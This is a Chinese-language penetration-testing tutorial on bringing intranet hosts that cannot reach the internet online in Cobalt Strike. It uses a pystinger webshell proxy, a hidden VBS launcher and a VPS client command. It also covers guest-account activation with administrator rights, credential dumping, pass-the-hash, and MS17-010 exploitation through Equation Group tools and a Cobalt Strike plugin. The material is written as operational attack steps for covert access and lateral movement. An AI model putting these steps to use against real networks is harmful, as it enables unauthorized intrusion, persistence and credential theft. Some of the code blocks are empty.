# cs上线

cs逐渐成为内网渗透中使用最多的工具，在目标不通外网的情况下，无法直接与公网的cs服务端建立连接。

## pystinger

下载地址：https://github.com/FunnyWolf/pystinger  
通过webshell实现内网SOCK4代理，端口映射可以使目标不出网情况下在cs上线。

![](../Images/733ec4a65c2fc2d698130cc963bd29d2.png)

直接使用cs多主机上线方法。  
首先上传对应语言的脚本到网站目录下。

![](../Images/b4023592dadaf33f71d9d8d3f5eab316.png)

将stinger\_server.exe上传到目标服务器  
创建stinger\_server.vbs文件,示例如下:

*   
*   

```
Set ws = CreateObject("Wscript.Shell")ws.run "cmd /c D:\XXXXX\stinger_server.exe 0.0.0.0",vbhide
```

![](../Images/ce8b601b5542df5b0b7b4026ca6e5935.png)![](../Images/b81b56f2c65c3cf7390a410b78b951ac.png)

把stinger\_client上传到公网vps，-w指定proxy的url地址运行。

*   
*   

```
chmod 777 stinger_client./stinger_client -w http://x.x.x.x/proxy.jsp -l 0.0.0.0 -p 60000
```

![](../Images/ddbf8f685d92c1c6f492f23dc5504452.png)

![](../Images/0dc5ca0501bc08e867538bf3efa3fd44.png)

![](../Images/e647e95761fa996f58e71b0954a7232d.png)

![](../Images/f9286ddc01663f3015e37e990f1f0e22.png)

抓取上线的主机密码。

![](../Images/3eb64293bed3e413730e2c1226baeebe.png)

对内网其它主机进行pth攻击，选择刚才建立的监听器。

![](../Images/825b792ec525aa8d8b4dc7e825f97e52.png)

目标主机成功上线。

![](../Images/53e461e5264a2c458fc1e0beaff88908.png)

坑点：使用过程中cs会话可能假死掉，需要把stinger\_server.exe进程结束掉，然后重新启动。

## 在目标内网搭建cs服务端

如果拿下了目标主机的管理员权限，可以激活guest用户，建立基于http的socks隧道，登录远程桌面，在目标内网搭建cs服务端。  
缺点：被发现概率上升；需要安装java环境；基于web的socks隧道速度很慢，心态容易蹦。  
首先激活guest用户

*   
*   
*   

```
net user guest   /active:yesnet user guest   1q2w3e4r@net localgroup   administrators  guest   /add
```

上传cs4.0到目标服务器。

![](../Images/eb1a4d302780d15020f29cd83314bc59.png)

运行服务端

*   

```

```

# ms17010横向利用

内网渗透中常用的攻击手段，随着补丁和杀软的普及，能利用的场景越来越少，而且容易造成目标蓝屏，影响业务，所以谨慎使用。  
之前的利用都是在通外网下情况下利用msf攻击。  
本次在目标不出网的情况下进行利用。

## 方程式漏洞利用工具

![](../Images/64d03ddc78cefb6dd46581170e5f90d3.png)

生成对应监听器的bin文件。

![](../Images/6ba4a2eeb7330b0e2039aeb9ceb21a5f.png)

使用msf把cs生成的bin文件转化为方程式利用工具可以使用的dll文件。

*   

```

```

![](../Images/e568facca4452b54f3dcf3767aff6e78.png)

把原来的x64.dll文件替换掉，把工具上传到目标主机上。  
设置targetip为存在漏洞的主机ip，设置系统类型，点击attack执行利用工具，利用成功返回success。

![](../Images/efc5939d4356a22de82c4cb9bf8ebf03.png)

选择doublepulsar模块，配置ip选择位数，默认加载dll，点击attack在攻击主机执行刚刚生成的x64.dll文件。

![](../Images/4fccedf0b948422d273fc5ff1fc2d600.png)

目标在cs上线成功。

![](../Images/53d55777660151199a226b34bf36eed7.png)

## cs永恒之蓝利用插件

下载地址：https://github.com/phink-team/Cobaltstrike-MS17-010  
cs安装下载的插件,导入aggressor.cna文件。  
使用pystinger多主机模式使内网主机在cs上线，生成对应的内网监听器test。

![](../Images/b8d1f1a54cd7dad0c2e2cd8fb5ee389e.png)

内网主机上线后，右键使用ms17-010攻击插件。

![](../Images/ccae9927ea8801b6ef3eac0141fa4485.png)

ip配置为存在漏洞的主机ip，监听器选择test，次数更改为1次，降低蓝屏风险。

![](../Images/010c4a9bf52382802fcd822c1a4ca213.png)

成功通过ms17-010攻击其它主机，cs上线成功。

![](../Images/f4820a114a8f78d5b7d3b54bb4741a6e.png)![](../Images/96bb5fa606b30e290fb82b9d9baaab2a.png)
